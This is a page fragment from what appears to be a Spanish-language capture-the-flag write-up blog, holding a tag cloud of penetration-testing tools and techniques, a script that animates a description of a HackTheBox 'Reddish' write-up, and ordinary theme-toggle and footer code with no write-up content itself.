href="/tag/command/" class="set-1">Command</a> <a href="/tag/contracts%2C/" class="set-1">Contracts,</a> <a href="/tag/cracking/" class="set-1">Cracking</a> <a href="/tag/crackmapexec%2C/" class="set-1">Crackmapexec,</a> <a href="/tag/cron-taks%2C/" class="set-1">Cron-taks,</a> <a href="/tag/crontabs%2C/" class="set-1">CronTabs,</a> <a href="/tag/crypto%2C/" class="set-1">Crypto,</a> <a href="/tag/curlftp%2C/" class="set-1">CurlFtp,</a> <a href="/tag/decimal%2C/" class="set-1">Decimal,</a> <a href="/tag/device/" class="set-1">Device</a> <a href="/tag/directory%2C/" class="set-1">Directory,</a> <a href="/tag/dockers%2C/" class="set-1">Dockers,</a> <a href="/tag/domain/" class="set-1">Domain</a> <a href="/tag/dominios%2C/" class="set-1">Dominios,</a> <a href="/tag/dovecot%2C/" class="set-1">Dovecot,</a> <a href="/tag/elastix%2C/" class="set-1">Elastix,</a> <a href="/tag/empezando%2C/" class="set-1">Empezando,</a> <a href="/tag/encrypt-decrypt%2C/" class="set-1">Encrypt-Decrypt,</a> <a href="/tag/enumeracion%2C/" class="set-1">Enumeracion,</a> <a href="/tag/enumeration%2C/" class="set-1">Enumeration,</a> <a href="/tag/ethereum%2C/" class="set-1">Ethereum,</a> <a href="/tag/evil-winrm%2C/" class="set-1">Evil-WinRm,</a> <a href="/tag/excel%2C/" class="set-1">Excel,</a> <a href="/tag/excell/" class="set-1">Excell</a> <a href="/tag/execel/" class="set-1">Execel</a> <a href="/tag/exploit%2C/" class="set-1">Exploit,</a> <a href="/tag/fail2ban%2C/" class="set-1">Fail2ban,</a> <a href="/tag/file/" class="set-1">File</a> <a href="/tag/file%2C/" class="set-1">File,</a> <a href="/tag/files%2C/" class="set-1">Files,</a> <a href="/tag/firefox%2C/" class="set-1">Firefox,</a> <a href="/tag/ftp%2C/" class="set-1">Ftp,</a> <a href="/tag/fueza/" class="set-1">Fueza</a> <a href="/tag/fuzzing/" class="set-1">Fuzzing</a> <a href="/tag/fuzzing%2C/" class="set-1">Fuzzing,</a> <a href="/tag/get-adobject%2C/" class="set-1">Get-ADObject,</a> <a href="/tag/getchanges-all%2C/" class="set-1">GetChanges-All,</a> <a href="/tag/gitlab%2C/" class="set-1">GitLab,</a> <a href="/tag/gitbucket%2C/" class="set-1">Gitbucket,</a> <a href="/tag/gratuitas./" class="set-1">Gratuitas.</a> <a href="/tag/group%2C/" class="set-1">Group,</a> <a href="/tag/groups%2C/" class="set-1">Groups,</a> <a href="/tag/guessing%2C/" class="set-1">Guessing,</a> <a href="/tag/gwolle%2C/" class="set-1">Gwolle,</a> <a href="/tag/htb%2C/" class="set-5">HTB,</a> <a href="/tag/hackthebox%2C/" class="set-1">HackTheBox,</a> <a href="/tag/hacking/" class="set-3">Hacking</a> <a href="/tag/hacking%2C/" class="set-2">Hacking,</a> <a href="/tag/heartbleed%2C/" class="set-1">HeartBleed,</a> <a href="/tag/hex%2C/" class="set-1">Hex,</a> <a href="/tag/hijacking%2C/" class="set-1">Hijacking,</a> <a href="/tag/hydra%2C/" class="set-1">Hydra,</a> <a href="/tag/iis%2C/" class="set-1">IIS,</a> <a href="/tag/iis-6.0%2C/" class="set-1">IIS-6.0,</a> <a href="/tag/ipfs%2C/" class="set-1">IPFS,</a> <a href="/tag/ipv6%2C/" class="set-1">IPV6,</a> <a href="/tag/irc%2C/" class="set-1">IRC,</a> <a href="/tag/id-rsa%2C/" class="set-1">Id-Rsa,</a> <a href="/tag/impackect-secretsdump%2C/" class="set-1">Impackect-SecretsDump,</a> <a href="/tag/import/" class="set-1">Import</a> <a href="/tag/inclusion%2C/" class="set-1">Inclusion,</a> <a href="/tag/injection%29%2C/" class="set-1">Injection),</a> <a href="/tag/injection%2C/" class="set-1">Injection,</a> <a href="/tag/jjs%2C/" class="set-1">JJS,</a> <a href="/tag/jndi%2C/" class="set-1">JNDI,</a> <a href="/tag/joomla%2C/" class="set-1">Joomla,</a> <a href="/tag/journalctl%2C/" class="set-1">Journalctl,</a> <a href="/tag/juicypotato%2C/" class="set-1">JuicyPotato,</a> <a href="/tag/kerberoasting/" class="set-1">Kerberoasting</a> <a href="/tag/kerbrute/" class="set-1">Kerbrute</a> <a href="/tag/kerbrute%2C/" class="set-1">Kerbrute,</a> <a href="/tag/kernel/" class="set-1">Kernel</a> <a href="/tag/knocking%2C/" class="set-1">Knocking,</a> <a href="/tag/kubernetes%2C/" class="set-1">Kubernetes,</a> <a href="/tag/ldap/" class="set-1">LDAP</a> <a href="/tag/ldap%2C/" class="set-1">LDAP,</a> <a href="/tag/lfi%2C/" class="set-1">LFI,</a> <a href="/tag/local/" class="set-1">Local</a> <a href="/tag/log4j%2C/" class="set-1">Log4j,</a> <a href="/tag/mail%2C/" class="set-1">Mail,</a> <a href="/tag/malicius/" class="set-1">Malicius</a> <a href="/tag/maquina/" class="set-1">Maquina</a> <a href="/tag/maquinas/" class="set-5">Maquinas</a> <a href="/tag/mattermost%2C/" class="set-1">Mattermost,</a> <a href="/tag/mimikatz.exe%2C/" class="set-1">Mimikatz.exe,</a> <a href="/tag/misconfigurations%2C/" class="set-1">Misconfigurations,</a> <a href="/tag/mongo-db%2C/" class="set-1">Mongo-db,</a> <a href="/tag/mongodb%2C/" class="set-1">MongoDB,</a> <a href="/tag/mr.robot%2C/" class="set-1">Mr.Robot,</a> <a href="/tag/mssqlclient%2C/" class="set-1">Mssqlclient,</a> <a href="/tag/multiples/" class="set-1">Multiples</a> <a href="/tag/myssql-server%2C/" class="set-1">Myssql-Server,</a> <a href="/tag/neo4j%2C/" class="set-1">Neo4j,</a> <a href="/tag/nibbleblog%2C/" class="set-1">NibbleBlog,</a> <a href="/tag/nishang%2C/" class="set-1">Nishang,</a> <a href="/tag/nosqli%2C/" class="set-1">NoSQLI,</a> <a href="/tag/node-red%2C/" class="set-1">Node-Red,</a> <a href="/tag/nostromo/" class="set-1">Nostromo</a> <a href="/tag/os/" class="set-1">OS</a> <a href="/tag/oscp/" class="set-3">OSCP</a> <a href="/tag/osticket%2C/" class="set-1">OSTicket,</a> <a href="/tag/offensive/" class="set-1">Offensive</a> <a href="/tag/olevba/" class="set-1">Olevba</a> <a href="/tag/php%2C/" class="set-1">PHP,</a> <a href="/tag/php./" class="set-1">PHP.</a> <a href="/tag/password/" class="set-1">Password</a> <a href="/tag/path/" class="set-1">Path</a> <a href="/tag/path%2C/" class="set-3">Path,</a> <a href="/tag/pivoting%2C/" class="set-1">Pivoting,</a> <a href="/tag/plugins%2C/" class="set-1">Plugins,</a> <a href="/tag/pods%2Fcontainer./" class="set-1">Pods/Container.</a> <a href="/tag/popd%2C/" class="set-1">PopD,</a> <a href="/tag/port/" class="set-1">Port</a> <a href="/tag/portknocking%2C/" class="set-1">PortKnocking,</a> <a href="/tag/portainer%2C/" class="set-1">Portainer,</a> <a href="/tag/portal%2C/" class="set-1">Portal,</a> <a href="/tag/post-explotacion./" class="set-1">Post-Explotacion.</a> <a href="/tag/powershell/" class="set-1">PowerShell</a> <a href="/tag/powerup%2C/" class="set-1">PowerUp,</a> <a href="/tag/powershell%2C/" class="set-1">Powershell,</a> <a href="/tag/privesc/" class="set-1">Privesc</a> <a href="/tag/privesc%2C/" class="set-1">Privesc,</a> <a href="/tag/proteccions%2C/" class="set-1">Proteccions,</a> <a href="/tag/protection%2C/" class="set-1">Protection,</a> <a href="/tag/python%2C/" class="set-1">Python,</a> <a href="/tag/python3%2C/" class="set-1">Python3,</a> <a href="/tag/rce%2C/" class="set-1">RCE,</a> <a href="/tag/rdp-file%2C/" class="set-1">RDP-file,</a> <a href="/tag/rpcclient%2C/" class="set-1">RPCCLIENT,</a> <a href="/tag/read%2C/" class="set-1">Read,</a> <a href="/tag/readgmsapassword%2C/" class="set-1">ReadGMSAPassword,</a> <a href="/tag/recycle/" class="set-1">Recycle</a> <a href="/tag/remote/" class="set-1">Remote</a> <a href="/tag/retiradas/" class="set-1">Retiradas</a> <a href="/tag/retiradas%2C/" class="set-5">Retiradas,</a> <a href="/tag/retiradas./" class="set-1">Retiradas.</a> <a href="/tag/revome/" class="set-1">Revome</a> <a href="/tag/smb%2C/" class="set-1">SMB,</a> <a href="/tag/snmp%2C/" class="set-1">SNMP,</a> <a href="/tag/sqli/" class="set-1">SQLI</a> <a href="/tag/sqli%2C/" class="set-1">SQLI,</a> <a href="/tag/sqlinjecction%2C/" class="set-1">SQLInjecction,</a> <a href="/tag/ss%2C/" class="set-1">SS,</a> <a href="/tag/ssh%2C/" class="set-1">SSH,</a> <a href="/tag/ssrf/" class="set-1">SSRF</a> <a href="/tag/ssrf%2C/" class="set-1">SSRF,</a> <a href="/tag/ssti%28server/" class="set-1">SSTI(Server</a> <a href="/tag/suid%2C/" class="set-1">SUID,</a> <a href="/tag/sam%2C/" class="set-1">Sam,</a> <a href="/tag/samba%2C/" class="set-1">Samba,</a> <a href="/tag/scheduler%2C/" class="set-1">Scheduler,</a> <a href="/tag/script%2C/" class="set-1">Script,</a> <a href="/tag/secretsdump.py%2C/" class="set-1">SecretsDump.py,</a> <a href="/tag/secretsdumps.py%2C/" class="set-1">Secretsdumps.py,</a> <a href="/tag/security%2C/" class="set-1">Security,</a> <a href="/tag/shares/" class="set-1">Shares</a> <a href="/tag/sharphound.ps1%2C/" class="set-1">SharpHound.ps1,</a> <a href="/tag/shellshock%2C/" class="set-1">ShellShock,</a> <a href="/tag/side/" class="set-1">Side</a> <a href="/tag/smart/" class="set-1">Smart</a> <a href="/tag/smb%2C/" class="set-1">Smb,</a> <a href="/tag/smbclient%2C/" class="set-1">SmbClient,</a> <a href="/tag/smbmap%2C/" class="set-1">SmbMap,</a> <a href="/tag/sqsh%2C/" class="set-1">Sqsh,</a> <a href="/tag/starting/" class="set-1">Starting</a> <a href="/tag/steganografia%2C/" class="set-1">Steganografia,</a> <a href="/tag/subdomains%2C/" class="set-1">Subdomains,</a> <a href="/tag/sudo/" class="set-1">Sudo</a> <a href="/tag/system%2C/" class="set-1">System,</a> <a href="/tag/thm%2C/" class="set-1">THM,</a> <a href="/tag/template/" class="set-1">Template</a> <a href="/tag/tmux-priv%2C/" class="set-1">Tmux-Priv,</a> <a href="/tag/tomcat/" class="set-1">Tomcat</a> <a href="/tag/tomcat%2C/" class="set-1">Tomcat,</a> <a href="/tag/transfer%2C/" class="set-1">Transfer,</a> <a href="/tag/transferencia/" class="set-1">Transferencia</a> <a href="/tag/tryhackme%2C/" class="set-1">TryHackMe,</a> <a href="/tag/ubuntu/" class="set-1">Ubuntu</a> <a href="/tag/unrealirc%2C/" class="set-1">UnRealIRC,</a> <a href="/tag/upload/" class="set-1">Upload</a> <a href="/tag/userenum%2C/" class="set-1">Userenum,</a> <a href="/tag/vnc/" class="set-1">VNC</a> <a href="/tag/web/" class="set-2">Web</a> <a href="/tag/web3%2C/" class="set-1">Web3,</a> <a href="/tag/webshell%2C/" class="set-1">Webshell,</a> <a href="/tag/wget/" class="set-1">Wget</a> <a href="/tag/winpeas%2C/" class="set-1">WinPeas,</a> <a href="/tag/windows/" class="set-1">Windows</a> <a href="/tag/windows%2C/" class="set-1">Windows,</a> <a href="/tag/wordpress%2C/" class="set-1">Wordpress,</a> <a href="/tag/wpscan%2C/" class="set-1">Wpscan,</a> <a href="/tag/writeup/" class="set-2">Writeup</a> <a href="/tag/writeup%2C/" class="set-3">Writeup,</a> <a href="/tag/x-forwarder-for%2C/" class="set-1">X-Forwarder-For,</a> <a href="/tag/xp_cmdshell%2C/" class="set-1">Xp_CmdShell,</a> <a href="/tag/xp_dirtree%2C/" class="set-1">Xp_dirtree,</a> <a href="/tag/ysoserial%2C/" class="set-1">Ysoserial,</a> <a href="/tag/zona%2C/" class="set-1">Zona,</a> <a href="/tag/zone/" class="set-1">Zone</a> <a href="/tag/app-js%2C/" class="set-1">app-js,</a> <a href="/tag/bashscript%2C/" class="set-1">bashscript,</a> <a href="/tag/chisel%2C/" class="set-1">chisel,</a> <a href="/tag/de/" class="set-1">de</a> <a href="/tag/dompdf%2C/" class="set-1">dompdf,</a> <a href="/tag/ecppt%2C/" class="set-1">eCPPT,</a> <a href="/tag/fcrackzip%2C/" class="set-1">fcrackzip,</a> <a href="/tag/html/" class="set-1">html</a> <a href="/tag/injecction/" class="set-1">injecction</a> <a href="/tag/msfvenom%2C/" class="set-1">msfvenom,</a> <a href="/tag/nmap%2C/" class="set-1">nmap,</a> <a href="/tag/pfsense%2C/" class="set-1">pfSense,</a> <a href="/tag/pfx2john%2C/" class="set-1">pfx2john,</a> <a href="/tag/phpliteadmin%2C/" class="set-1">phpLiteAdmin,</a> <a href="/tag/privesc/" class="set-1">privesc</a> <a href="/tag/privesc%2C/" class="set-1">privesc,</a> <a href="/tag/python%2C/" class="set-1">python,</a> <a href="/tag/redis-cli%2C/" class="set-1">redis-cli,</a> <a href="/tag/rsync%2C/" class="set-1">rsync,</a> <a href="/tag/smtpd%2C/" class="set-1">smtpd,</a> <a href="/tag/socat%2C/" class="set-1">socat,</a> <a href="/tag/squidproxy%2C/" class="set-1">squidproxy,</a> <a href="/tag/steghide%2C/" class="set-1">steghide,</a> <a href="/tag/tar%2C/" class="set-1">tar,</a> <a href="/tag/webdav%2C/" class="set-1">webdav,</a> <a href="/tag/welcome/" class="set-1">welcome</a> <a href="/tag/xss/" class="set-1">xss</a></div>
  




<script>
  let i = 0;
  const text = 'En esta ocasion empezaremos con el Writeup de la maquina de HackTheBox llamada REDDISH';
  const speed = parseInt('50');
  
  function typeWriter() {
    if (i < text.length) {
      document.getElementById('animated-post-description').innerHTML += text.charAt(i);
      i++;
      setTimeout(typeWriter, speed);
    }
  }

  document.getElementById('animated-post-description').style.display = 'initial';
  typeWriter();
</script>

      </div>
    </main><footer class="site-footer">
  <div class="wrapper">
    <div class="credits"><a href="https://github.com/bitbrain/jekyll-dash">dash</a> theme for Jekyll by <a href="https://github.com/bitbrain">bitbrain</a> made with <i class="fas fa-heart"></i><div class="toggleWrapper">
    <input type="checkbox" class="dn" id="theme-toggle" onclick="modeSwitcher()" checked />
    <label for="theme-toggle" class="toggle">
    <span class="toggle__handler">
      <span class="crater crater--1"></span>
      <span class="crater crater--2"></span>
      <span class="crater crater--3"></span>
    </span>
        <span class="star star--1"></span>
        <span class="star star--2"></span>
        <span class="star star--3"></span>
        <span class="star star--4"></span>
        <span class="star star--5"></span>
        <span class="star star--6"></span>
    </label>
</div>
<script type="text/javascript">
const theme = localStorage.getItem('theme');

if (theme === "light") {
    document.documentElement.setAttribute('data-theme', 'light');
} else {
    document.documentElement.setAttribute('data-theme', 'dark');
}
const userPrefers = getComputedStyle(document.documentElement).getPropertyValue('content');

function activateDarkTheme() {
    document.getElementById('theme-toggle').checked = true;
    document.documentElement.setAttribute('data-theme', 'dark');
    document.documentElement.classList.add('theme--dark');
    document.documentElement.classList.remove('theme--light');
	document.getElementById("theme-toggle").className = 'light';
	window.localStorage.setItem('theme', 'dark');
}

function activateLightTheme() {
    document.getElementById('theme-toggle').checked = false;
    document.documentElement.setAttribute('data-theme', 'light');
    document.documentElement.classList.add('theme--light');
    document.documentElement.classList.remove('theme--dark');
	document.getElementById("theme-toggle").className = 'dark';
	window.localStorage.setItem('theme', 'light');
}

if (theme === "dark") {
    activateDarkTheme();
} else if (theme === "light") {
    activateLightTheme();
} else if  (userPrefers === "light") {
    activateDarkTheme();
} else {
    activateDarkTheme();
}

function modeSwitcher() {
	let currentMode = document.documentElement.getAttribute('data-theme');
	if (currentMode === "dark") {
	    activateLightTheme();
	} else {
	    activateDarkTheme();
	}
}
</script></div>
  </div>
</footer>


<script>
      window.FontAwesomeConfig = {
        searchPseudoElements: true
      }
    </script>
  </body>

</html>
